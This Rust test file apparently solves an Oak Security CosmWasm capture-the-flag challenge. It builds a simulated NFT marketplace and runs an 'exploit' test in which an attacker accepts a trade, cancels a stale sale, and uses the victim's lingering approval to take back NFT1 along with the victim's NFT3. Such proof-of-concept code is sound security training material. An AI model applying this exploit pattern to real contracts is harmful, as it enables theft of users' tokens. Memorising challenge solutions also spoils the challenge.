use cosmwasm_std::{Addr, Empty, Uint128};
use cw721::{Cw721QueryMsg, OwnerOfResponse};
use cw_multi_test::{App, Contract, ContractWrapper, Executor};
use crate:: msg::{ExecuteMsg, InstantiateMsg};
use super::*;


pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
    let contract = ContractWrapper::new(
        crate::contract::execute,
        crate::contract::instantiate,
        crate::contract::query,
    )
    .with_reply(crate::contract::reply);
    Box::new(contract)
}

fn token_contract() -> Box<dyn Contract<Empty>> {
    let contract = ContractWrapper::new(
        cw721_base::entry::execute,
        cw721_base::entry::instantiate,
        cw721_base::entry::query,
    );
    Box::new(contract)
}

/// Three users receive NFTs: User1, User2, User3
/// Two NFT sales are created:
/// - User1 (NFT1) - tradeable
/// - User2 (NFT2) - tradeable
pub fn base_scenario() -> (App, Addr, Addr) {
    let mut app = App::default();
    let challenge_id = app.store_code(challenge_contract());
    let cw_721_id = app.store_code(token_contract());

    // Init token
    let token_inst = cw721_base::msg::InstantiateMsg {
        name: "OakSec NFT".to_string(),
        symbol: "OSNFT".to_string(),
        minter: ADMIN.to_string(),
    };

    let token_addr = app
        .instantiate_contract(
            cw_721_id,
            Addr::unchecked(ADMIN),
            &token_inst,
            &[],
            "nft token",
            None,
        )
        .unwrap();

    // Init challenge
    let challenge_inst = InstantiateMsg {
        nft_address: token_addr.to_string(),
    };

    let contract_addr = app
        .instantiate_contract(
            challenge_id,
            Addr::unchecked(ADMIN),
            &challenge_inst,
            &[],
            "test",
            None,
        )
        .unwrap();

    // Minting one to User1
    app.execute_contract(
        Addr::unchecked(ADMIN),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
            token_id: NFT1.to_string(),
            owner: USER1.to_string(),
            token_uri: Some("https://www.oaksecurity.io".to_string()),
            extension: Empty::default(),
        },
        &[],
    )
    .unwrap();
    // Minting one to User2
    app.execute_contract(
        Addr::unchecked(ADMIN),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
            token_id: NFT2.to_string(),
            owner: USER2.to_string(),
            token_uri: Some("https://www.oaksecurity.io".to_string()),
            extension: Empty::default(),
        },
        &[],
    )
    .unwrap();
    // Minting one to User3
    app.execute_contract(
        Addr::unchecked(ADMIN),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
            token_id: NFT3.to_string(),
            owner: USER3.to_string(),
            token_uri: Some("https://www.oaksecurity.io".to_string()),
            extension: Empty::default(),
        },
        &[],
    )
    .unwrap();

    // Create a new tradable sale for User1
    app.execute_contract(
        Addr::unchecked(USER1),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
            spender: contract_addr.to_string(),
            token_id: NFT1.to_string(),
            expires: None,
        },
        &[],
    )
    .unwrap();
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::NewSale {
            id: NFT1.to_string(),
            price: Uint128::from(100u128),
            tradable: true,
        },
        &[],
    )
    .unwrap();

    // Create a new tradable sale for User2
    app.execute_contract(
        Addr::unchecked(USER2),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
            spender: contract_addr.to_string(),
            token_id: NFT2.to_string(),
            expires: None,
        },
        &[],
    )
    .unwrap();
    app.execute_contract(
        Addr::unchecked(USER2),
        contract_addr.clone(),
        &ExecuteMsg::NewSale {
            id: NFT2.to_string(),
            price: Uint128::from(150u128),
            tradable: true,
        },
        &[],
    )
    .unwrap();

    (app, contract_addr, token_addr)
}

#[test]
fn exploit() {
    let (mut app, contract_addr, token_addr) = base_scenario();

    // In this scenario, USER1 is the attacker and USER3 is the victim
    const ATTACKER: &str = USER1;
    const VICTIM: &str = USER3;

    // The Victim wants to trade with the Attacker
    app.execute_contract(
        Addr::unchecked(VICTIM),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
            spender: contract_addr.to_string(),
            token_id: NFT3.to_string(),
            expires: None,
        },
        &[],
    )
    .unwrap();
    app.execute_contract(
        Addr::unchecked(VICTIM),
        contract_addr.clone(),
        &ExecuteMsg::NewTrade {
            target: NFT1.to_string(),
            offered: NFT3.to_string(),
        },
        &[],
    )
    .unwrap();

    // The Attacker accepts the trade
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::AcceptTrade {
            id: NFT1.to_string(),
            trader: VICTIM.to_string(),
        },
        &[],
    )
    .unwrap();

    // Now, the Victim wants to trade their new NFT1 for NFT2, owned by USER2
    app.execute_contract(
        Addr::unchecked(VICTIM),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
            spender: contract_addr.to_string(),
            token_id: NFT1.to_string(),
            expires: None,
        },
        &[],
    )
    .unwrap();
    app.execute_contract(
        Addr::unchecked(VICTIM),
        contract_addr.clone(),
        &ExecuteMsg::NewTrade {
            target: NFT2.to_string(),
            offered: NFT1.to_string(),
        },
        &[],
    )
    .unwrap();

    // Check ownerships at this point
    let owner_of_1: OwnerOfResponse = app
    .wrap()
    .query_wasm_smart(
        token_addr.clone(),
        &Cw721QueryMsg::OwnerOf {
            token_id: NFT1.to_string(),
            include_expired: None,
        },
    )
    .unwrap();
    assert_eq!(owner_of_1.owner, VICTIM.to_string());
    let owner_of_2: OwnerOfResponse = app
    .wrap()
    .query_wasm_smart(
        token_addr.clone(),
        &Cw721QueryMsg::OwnerOf {
            token_id: NFT2.to_string(),
            include_expired: None,
        },
    )
    .unwrap();
    assert_eq!(owner_of_2.owner, contract_addr.to_string()); //The owner is the Contract, not USER2, as it has already been transfer
    let owner_of_3: OwnerOfResponse = app
    .wrap()
    .query_wasm_smart(
        token_addr.clone(),
        &Cw721QueryMsg::OwnerOf {
            token_id: NFT3.to_string(),
            include_expired: None,
        },
    )
    .unwrap();
    assert_eq!(owner_of_3.owner, ATTACKER.to_string());   


    // ATTACKER is no longer the owner of NFT1, but the contract's Sale is still in storage and considers
    // that ATTACKER is the owner of NFT1. If ATTACKER cancels the sale we would expect an error as the 
    // contract is no longer the owner of NFT1... 
    // However! in order for VICTIM to be able to trade NF1 for NFT2 they approved the contract
    // to spend NFT1 (line 210). This means that the contract can still transfer NFT1 to ATTACKER when 
    // the Sale is canceled
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::CancelSale {
            id: NFT1.to_string(),
        },
        &[],
    )
    .unwrap();

    // Check final ownerships
    let owner_of_1: OwnerOfResponse = app
    .wrap()
    .query_wasm_smart(
        token_addr.clone(),
        &Cw721QueryMsg::OwnerOf {
            token_id: NFT1.to_string(),
            include_expired: None,
        },
    )
    .unwrap();
    assert_eq!(owner_of_1.owner, ATTACKER.to_string());
    let owner_of_2: OwnerOfResponse = app
    .wrap()
    .query_wasm_smart(
        token_addr.clone(),
        &Cw721QueryMsg::OwnerOf {
            token_id: NFT2.to_string(),
            include_expired: None,
        },
    )
    .unwrap();
    assert_eq!(owner_of_2.owner, contract_addr.to_string()); //The owner is the Contract, not USER2, as it has already been transfer
    let owner_of_3: OwnerOfResponse = app
    .wrap()
    .query_wasm_smart(
        token_addr.clone(),
        &Cw721QueryMsg::OwnerOf {
            token_id: NFT3.to_string(),
            include_expired: None,
        },
    )
    .unwrap();
    assert_eq!(owner_of_3.owner, ATTACKER.to_string()); 
}
